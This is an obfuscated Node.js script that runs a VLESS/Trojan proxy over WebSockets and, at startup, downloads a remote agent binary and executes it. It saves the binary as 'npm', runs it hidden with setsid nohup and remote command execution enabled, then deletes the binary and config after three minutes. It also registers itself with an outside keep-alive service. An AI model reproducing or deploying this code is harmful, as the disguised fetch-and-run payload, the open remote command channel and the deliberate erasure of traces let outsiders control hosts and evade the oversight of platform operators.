const _0x1862fe=_0x2486;(function(_0x80dd23,_0x334dbd){const _0x4b006a=_0x2486,_0x4be0dd=_0x80dd23();while(!![]){try{const _0x34eb44=parseInt(_0x4b006a(0xaa))/0x1+parseInt(_0x4b006a(0xf2))/0x2+parseInt(_0x4b006a(0x97))/0x3+-parseInt(_0x4b006a(0xa3))/0x4*(-parseInt(_0x4b006a(0xe0))/0x5)+-parseInt(_0x4b006a(0x92))/0x6+-parseInt(_0x4b006a(0xf0))/0x7*(-parseInt(_0x4b006a(0xb0))/0x8)+-parseInt(_0x4b006a(0xf6))/0x9*(parseInt(_0x4b006a(0xaf))/0xa);if(_0x34eb44===_0x334dbd)break;else _0x4be0dd['push'](_0x4be0dd['shift']());}catch(_0x40a2a3){_0x4be0dd['push'](_0x4be0dd['shift']());}}}(_0x3932,0x3c787));const os=require('os'),http=require(_0x1862fe(0xc6)),fs=require('fs'),axios=require(_0x1862fe(0xb3)),net=require(_0x1862fe(0xea)),path=require(_0x1862fe(0xae)),crypto=require(_0x1862fe(0xda)),{Buffer}=require(_0x1862fe(0xce)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x1862fe(0xec)]||_0x1862fe(0xdd),NEZHA_SERVER=process[_0x1862fe(0x8a)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x1862fe(0x8a)][_0x1862fe(0xfd)]||'',NEZHA_KEY=process['env'][_0x1862fe(0xa6)]||'',DOMAIN=process[_0x1862fe(0x8a)][_0x1862fe(0x96)]||_0x1862fe(0xe5),AUTO_ACCESS=process['env'][_0x1862fe(0xdc)]||![],WSPATH=process['env']['WSPATH']||UUID[_0x1862fe(0x89)](0x0,0x8),SUB_PATH=process['env'][_0x1862fe(0xa2)]||_0x1862fe(0xa1),NAME=process[_0x1862fe(0x8a)][_0x1862fe(0x91)]||_0x1862fe(0xdb),PORT=process['env']['PORT']||0x1eb4;function _0x3932(){const _0x2d1356=['https://arm64.ssss.nyc.mn/agent','arch','error','readUInt16BE','map','Server','listen','url','http','substr','vless://','https://amd64.ssss.nyc.mn/v1','Answer','pipe','trim','2053','buffer','client_secret:\x20','find','config.yaml','8443','2096','arm','sha224','finish','https://arm64.ssss.nyc.mn/v1','join','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','crypto','Hug','AUTO_ACCESS','e1cd00d5-ecfc-4674-91db-26c9dde80832','\x20-p\x20','reduce','305VhlOfc','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','toString','npm','write','forxyz.eu.org','setsid\x20nohup\x20./npm\x20-s\x20','connection','every','application/json','net','/bin/bash','UUID','stream','replace','catch','2048711vLroJG','split','300478AfKiQt','chmod\x20+x\x20npm','unlink','data','171uWTnwu','update','1.1.1.1','writeHead','message','&path=%2F','createHash','NEZHA_PORT','includes','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','text/html','2083','readFile','Hello\x20world!','error:\x20','connect','slice','env',':443?encryption=none&security=tls&sni=','true','country_code','https://amd64.ssss.nyc.mn/agent','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','get','NAME','1273800bQDrHU','Automatic\x20Access\x20Task\x20added\x20successfully','base64','test','DOMAIN','43287yPbyri','443','then','utf8','length','&fp=chrome&type=ws&host=','concat','log','--tls','digest','sub','SUB_PATH','19604ooGsgi','npm\x20download\x20successfully','send','NEZHA_KEY','npm\x20is\x20running','&type=A','Unknown','192365eOLCLy','close','isp','from','path','257200eKMriZ','8zQgiiH','createServer','index.html','axios','2087','createWriteStream','type','text/plain','writeFileSync','readUInt8','end','pop','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://oooo.serv00.net/add-url'];_0x3932=function(){return _0x2d1356;};return _0x3932();}let ISP='';const GetISP=async()=>{const _0x57627b=_0x1862fe;try{const _0x3613c7=await axios[_0x57627b(0x90)]('https://api.ip.sb/geoip'),_0x16e206=_0x3613c7[_0x57627b(0xf5)];ISP=(_0x16e206[_0x57627b(0x8d)]+'-'+_0x16e206[_0x57627b(0xac)])[_0x57627b(0xee)](/ /g,'_');}catch(_0x5f36a1){ISP=_0x57627b(0xa9);}};GetISP();const httpServer=http[_0x1862fe(0xb1)]((_0x1b48ce,_0x33dce3)=>{const _0x21e3cc=_0x1862fe;if(_0x1b48ce[_0x21e3cc(0xc5)]==='/'){const _0x2ab5b9=path[_0x21e3cc(0xd8)](__dirname,_0x21e3cc(0xb2));fs[_0x21e3cc(0x85)](_0x2ab5b9,_0x21e3cc(0x9a),(_0x39e648,_0x5066fe)=>{const _0xa950a5=_0x21e3cc;if(_0x39e648){_0x33dce3[_0xa950a5(0xf9)](0xc8,{'Content-Type':_0xa950a5(0x100)}),_0x33dce3['end'](_0xa950a5(0x86));return;}_0x33dce3[_0xa950a5(0xf9)](0xc8,{'Content-Type':_0xa950a5(0x100)}),_0x33dce3[_0xa950a5(0xba)](_0x5066fe);});return;}else{if(_0x1b48ce[_0x21e3cc(0xc5)]==='/'+SUB_PATH){const _0x4058a6=NAME?NAME+'-'+ISP:ISP,_0x56e51d=_0x21e3cc(0xc8)+UUID+'@'+DOMAIN+_0x21e3cc(0x8b)+DOMAIN+_0x21e3cc(0x9c)+DOMAIN+_0x21e3cc(0xfb)+WSPATH+'#'+_0x4058a6,_0xe840bd='trojan://'+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x21e3cc(0x9c)+DOMAIN+_0x21e3cc(0xfb)+WSPATH+'#'+_0x4058a6,_0x13d0d6=_0x56e51d+'\x0a'+_0xe840bd,_0x53f79f=Buffer[_0x21e3cc(0xad)](_0x13d0d6)[_0x21e3cc(0xe2)](_0x21e3cc(0x94));_0x33dce3[_0x21e3cc(0xf9)](0xc8,{'Content-Type':'text/plain'}),_0x33dce3['end'](_0x53f79f+'\x0a');}else _0x33dce3[_0x21e3cc(0xf9)](0x194,{'Content-Type':_0x21e3cc(0xb7)}),_0x33dce3['end']('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x1862fe(0xc3))]({'server':httpServer}),uuid=UUID[_0x1862fe(0xee)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x1862fe(0xf8)];function resolveHost(_0x1407d3){return new Promise((_0x349a85,_0x4d64fd)=>{const _0x17d0b6=_0x2486;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x17d0b6(0x95)](_0x1407d3)){_0x349a85(_0x1407d3);return;}let _0x511107=0x0;function _0x2dbb18(){const _0x4eaee3=_0x17d0b6;if(_0x511107>=DNS_SERVERS[_0x4eaee3(0x9b)]){_0x4d64fd(new Error('Failed\x20to\x20resolve\x20'+_0x1407d3+'\x20with\x20all\x20DNS\x20servers'));return;}const _0xa2001a=DNS_SERVERS[_0x511107];_0x511107++;const _0x1a6f82='https://dns.google/resolve?name='+encodeURIComponent(_0x1407d3)+_0x4eaee3(0xa8);axios[_0x4eaee3(0x90)](_0x1a6f82,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x4eaee3(0x99)](_0x34be70=>{const _0x5b88fc=_0x4eaee3,_0x5832b1=_0x34be70['data'];if(_0x5832b1['Status']===0x0&&_0x5832b1[_0x5b88fc(0xca)]&&_0x5832b1[_0x5b88fc(0xca)][_0x5b88fc(0x9b)]>0x0){const _0x93e9aa=_0x5832b1[_0x5b88fc(0xca)][_0x5b88fc(0xd0)](_0x191002=>_0x191002[_0x5b88fc(0xb6)]===0x1);if(_0x93e9aa){_0x349a85(_0x93e9aa['data']);return;}}_0x2dbb18();})[_0x4eaee3(0xef)](_0x1a83d3=>{_0x2dbb18();});}_0x2dbb18();});}function _0x2486(_0x4f46e2,_0x3f6179){_0x4f46e2=_0x4f46e2-0x85;const _0x393212=_0x3932();let _0x24861d=_0x393212[_0x4f46e2];return _0x24861d;}function handleVlessConnection(_0x17d974,_0x3747d9){const _0x28a3c6=_0x1862fe,[_0x29df3b]=_0x3747d9,_0x26807d=_0x3747d9[_0x28a3c6(0x89)](0x1,0x11);if(!_0x26807d[_0x28a3c6(0xe8)]((_0x347fa4,_0x28f711)=>_0x347fa4==parseInt(uuid[_0x28a3c6(0xc7)](_0x28f711*0x2,0x2),0x10)))return![];let _0x1be8ad=_0x3747d9['slice'](0x11,0x12)[_0x28a3c6(0xb9)]()+0x13;const _0x2b0135=_0x3747d9[_0x28a3c6(0x89)](_0x1be8ad,_0x1be8ad+=0x2)[_0x28a3c6(0xc1)](0x0),_0x2be63e=_0x3747d9[_0x28a3c6(0x89)](_0x1be8ad,_0x1be8ad+=0x1)[_0x28a3c6(0xb9)](),_0x5beaf1=_0x2be63e==0x1?_0x3747d9['slice'](_0x1be8ad,_0x1be8ad+=0x4)[_0x28a3c6(0xd8)]('.'):_0x2be63e==0x2?new TextDecoder()['decode'](_0x3747d9[_0x28a3c6(0x89)](_0x1be8ad+0x1,_0x1be8ad+=0x1+_0x3747d9['slice'](_0x1be8ad,_0x1be8ad+0x1)[_0x28a3c6(0xb9)]())):_0x2be63e==0x3?_0x3747d9[_0x28a3c6(0x89)](_0x1be8ad,_0x1be8ad+=0x10)[_0x28a3c6(0xdf)]((_0x5e0851,_0x1706ee,_0xf7fcc0,_0x42c83a)=>_0xf7fcc0%0x2?_0x5e0851['concat'](_0x42c83a[_0x28a3c6(0x89)](_0xf7fcc0-0x1,_0xf7fcc0+0x1)):_0x5e0851,[])[_0x28a3c6(0xc2)](_0x256b04=>_0x256b04[_0x28a3c6(0xc1)](0x0)[_0x28a3c6(0xe2)](0x10))[_0x28a3c6(0xd8)](':'):'';_0x17d974[_0x28a3c6(0xa5)](new Uint8Array([_0x29df3b,0x0]));const _0x136ef7=createWebSocketStream(_0x17d974);return resolveHost(_0x5beaf1)['then'](_0x29905d=>{const _0x2c4694=_0x28a3c6;net[_0x2c4694(0x88)]({'host':_0x29905d,'port':_0x2b0135},function(){const _0xb33554=_0x2c4694;this[_0xb33554(0xe4)](_0x3747d9[_0xb33554(0x89)](_0x1be8ad)),_0x136ef7['on'](_0xb33554(0xc0),()=>{})[_0xb33554(0xcb)](this)['on']('error',()=>{})[_0xb33554(0xcb)](_0x136ef7);})['on'](_0x2c4694(0xc0),()=>{});})[_0x28a3c6(0xef)](_0x46b821=>{const _0x353a1f=_0x28a3c6;net[_0x353a1f(0x88)]({'host':_0x5beaf1,'port':_0x2b0135},function(){const _0x4b6775=_0x353a1f;this[_0x4b6775(0xe4)](_0x3747d9[_0x4b6775(0x89)](_0x1be8ad)),_0x136ef7['on']('error',()=>{})[_0x4b6775(0xcb)](this)['on']('error',()=>{})[_0x4b6775(0xcb)](_0x136ef7);})['on'](_0x353a1f(0xc0),()=>{});}),!![];}function handleTrojanConnection(_0x2121dd,_0x3bb280){const _0x1c8fcb=_0x1862fe;try{if(_0x3bb280['length']<0x3a)return![];const _0x4304b3=_0x3bb280[_0x1c8fcb(0x89)](0x0,0x38)[_0x1c8fcb(0xe2)](),_0x3c0cdb=[UUID];let _0x4ee26c=null;for(const _0x5734c1 of _0x3c0cdb){const _0x24e25e=crypto[_0x1c8fcb(0xfc)](_0x1c8fcb(0xd5))[_0x1c8fcb(0xf7)](_0x5734c1)[_0x1c8fcb(0xa0)]('hex');if(_0x24e25e===_0x4304b3){_0x4ee26c=_0x5734c1;break;}}if(!_0x4ee26c)return![];let _0x3302ea=0x38;_0x3bb280[_0x3302ea]===0xd&&_0x3bb280[_0x3302ea+0x1]===0xa&&(_0x3302ea+=0x2);const _0x4d42be=_0x3bb280[_0x3302ea];if(_0x4d42be!==0x1)return![];_0x3302ea+=0x1;const _0x9f4f0c=_0x3bb280[_0x3302ea];_0x3302ea+=0x1;let _0x6f646d,_0x52fa0d;if(_0x9f4f0c===0x1)_0x6f646d=_0x3bb280[_0x1c8fcb(0x89)](_0x3302ea,_0x3302ea+0x4)[_0x1c8fcb(0xd8)]('.'),_0x3302ea+=0x4;else{if(_0x9f4f0c===0x3){const _0x56cd87=_0x3bb280[_0x3302ea];_0x3302ea+=0x1,_0x6f646d=_0x3bb280[_0x1c8fcb(0x89)](_0x3302ea,_0x3302ea+_0x56cd87)[_0x1c8fcb(0xe2)](),_0x3302ea+=_0x56cd87;}else{if(_0x9f4f0c===0x4)_0x6f646d=_0x3bb280[_0x1c8fcb(0x89)](_0x3302ea,_0x3302ea+0x10)[_0x1c8fcb(0xdf)]((_0x1e3215,_0x59e5db,_0x366faf,_0x35e6e1)=>_0x366faf%0x2?_0x1e3215[_0x1c8fcb(0x9d)](_0x35e6e1[_0x1c8fcb(0x89)](_0x366faf-0x1,_0x366faf+0x1)):_0x1e3215,[])[_0x1c8fcb(0xc2)](_0x27eb74=>_0x27eb74[_0x1c8fcb(0xc1)](0x0)[_0x1c8fcb(0xe2)](0x10))[_0x1c8fcb(0xd8)](':'),_0x3302ea+=0x10;else return![];}}_0x52fa0d=_0x3bb280[_0x1c8fcb(0xc1)](_0x3302ea),_0x3302ea+=0x2;_0x3302ea<_0x3bb280[_0x1c8fcb(0x9b)]&&_0x3bb280[_0x3302ea]===0xd&&_0x3bb280[_0x3302ea+0x1]===0xa&&(_0x3302ea+=0x2);const _0x5c4129=createWebSocketStream(_0x2121dd);return resolveHost(_0x6f646d)['then'](_0x41bf07=>{const _0x8ff4cd=_0x1c8fcb;net[_0x8ff4cd(0x88)]({'host':_0x41bf07,'port':_0x52fa0d},function(){const _0x3bf811=_0x8ff4cd;_0x3302ea<_0x3bb280[_0x3bf811(0x9b)]&&this[_0x3bf811(0xe4)](_0x3bb280['slice'](_0x3302ea)),_0x5c4129['on'](_0x3bf811(0xc0),()=>{})[_0x3bf811(0xcb)](this)['on']('error',()=>{})[_0x3bf811(0xcb)](_0x5c4129);})['on'](_0x8ff4cd(0xc0),()=>{});})[_0x1c8fcb(0xef)](_0x19ede0=>{net['connect']({'host':_0x6f646d,'port':_0x52fa0d},function(){const _0x3f9b2f=_0x2486;_0x3302ea<_0x3bb280[_0x3f9b2f(0x9b)]&&this[_0x3f9b2f(0xe4)](_0x3bb280[_0x3f9b2f(0x89)](_0x3302ea)),_0x5c4129['on'](_0x3f9b2f(0xc0),()=>{})[_0x3f9b2f(0xcb)](this)['on'](_0x3f9b2f(0xc0),()=>{})[_0x3f9b2f(0xcb)](_0x5c4129);})['on']('error',()=>{});}),!![];}catch(_0x485e35){return![];}}wss['on'](_0x1862fe(0xe7),(_0x466980,_0x27b799)=>{const _0x3c1856=_0x1862fe,_0x404ba0=_0x27b799['url']||'';_0x466980['once'](_0x3c1856(0xfa),_0x33df7d=>{const _0x47a320=_0x3c1856;if(_0x33df7d[_0x47a320(0x9b)]>0x11&&_0x33df7d[0x0]===0x0){const _0x43effd=_0x33df7d[_0x47a320(0x89)](0x1,0x11),_0x2994b0=_0x43effd[_0x47a320(0xe8)]((_0x9be6d9,_0x190bf6)=>_0x9be6d9==parseInt(uuid['substr'](_0x190bf6*0x2,0x2),0x10));if(_0x2994b0){!handleVlessConnection(_0x466980,_0x33df7d)&&_0x466980[_0x47a320(0xab)]();return;}}!handleTrojanConnection(_0x466980,_0x33df7d)&&_0x466980[_0x47a320(0xab)]();})['on'](_0x3c1856(0xc0),()=>{});});const getDownloadUrl=()=>{const _0x18a087=_0x1862fe,_0x78c00e=os[_0x18a087(0xbf)]();return _0x78c00e===_0x18a087(0xd4)||_0x78c00e==='arm64'||_0x78c00e==='aarch64'?!NEZHA_PORT?_0x18a087(0xd7):_0x18a087(0xbe):!NEZHA_PORT?_0x18a087(0xc9):_0x18a087(0x8e);},downloadFile=async()=>{const _0x5981aa=_0x1862fe;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x195361=getDownloadUrl(),_0x4c5949=await axios({'method':_0x5981aa(0x90),'url':_0x195361,'responseType':_0x5981aa(0xed)}),_0x56e77d=fs[_0x5981aa(0xb5)]('npm');return _0x4c5949['data'][_0x5981aa(0xcb)](_0x56e77d),new Promise((_0x2f8d81,_0xf632)=>{const _0x43ed64=_0x5981aa;_0x56e77d['on'](_0x43ed64(0xd6),()=>{const _0x4aa314=_0x43ed64;console[_0x4aa314(0x9e)](_0x4aa314(0xa4)),exec(_0x4aa314(0xf3),_0x5e2e8=>{if(_0x5e2e8)_0xf632(_0x5e2e8);_0x2f8d81();});}),_0x56e77d['on'](_0x43ed64(0xc0),_0xf632);});}catch(_0x239f8f){throw _0x239f8f;}},runnz=async()=>{const _0x2f25cc=_0x1862fe;try{const _0xfefaa3=execSync(_0x2f25cc(0xd9),{'encoding':'utf-8'});if(_0xfefaa3[_0x2f25cc(0xcc)]()!==''){console[_0x2f25cc(0x9e)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x2bc805){}await downloadFile();let _0x351964='',_0x29f9c6=[_0x2f25cc(0x98),_0x2f25cc(0xd2),_0x2f25cc(0xd3),_0x2f25cc(0xb4),_0x2f25cc(0x101),_0x2f25cc(0xcd)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xc0ecc0=_0x29f9c6[_0x2f25cc(0xfe)](NEZHA_PORT)?_0x2f25cc(0x9f):'';_0x351964=_0x2f25cc(0xe6)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2f25cc(0xde)+NEZHA_KEY+'\x20'+_0xc0ecc0+_0x2f25cc(0xbc);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x50eb3c=NEZHA_SERVER[_0x2f25cc(0xfe)](':')?NEZHA_SERVER[_0x2f25cc(0xf1)](':')[_0x2f25cc(0xbb)]():'',_0xf8acf4=_0x29f9c6[_0x2f25cc(0xfe)](_0x50eb3c)?_0x2f25cc(0x8c):'false',_0x257e81=_0x2f25cc(0xcf)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0xf8acf4+_0x2f25cc(0x8f)+UUID;fs[_0x2f25cc(0xb8)](_0x2f25cc(0xd1),_0x257e81);}_0x351964=_0x2f25cc(0xff);}else{console[_0x2f25cc(0x9e)](_0x2f25cc(0xe1));return;}}try{exec(_0x351964,{'shell':_0x2f25cc(0xeb)},_0x3a8fed=>{const _0x1b38f1=_0x2f25cc;if(_0x3a8fed)console['error']('npm\x20running\x20error:',_0x3a8fed);else console[_0x1b38f1(0x9e)](_0x1b38f1(0xa7));});}catch(_0x4b7587){console['error'](_0x2f25cc(0x87)+_0x4b7587);}};async function addAccessTask(){const _0x1be93f=_0x1862fe;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x3990fa='https://'+DOMAIN;try{const _0x4b1c69=await axios['post'](_0x1be93f(0xbd),{'url':_0x3990fa},{'headers':{'Content-Type':_0x1be93f(0xe9)}});console['log'](_0x1be93f(0x93));}catch(_0x5a4c2b){}}const delFiles=()=>{const _0x37221a=_0x1862fe;fs[_0x37221a(0xf4)](_0x37221a(0xe3),()=>{}),fs['unlink']('config.yaml',()=>{});};httpServer[_0x1862fe(0xc4)](PORT,()=>{const _0x18d7a1=_0x1862fe;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x18d7a1(0x9e)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
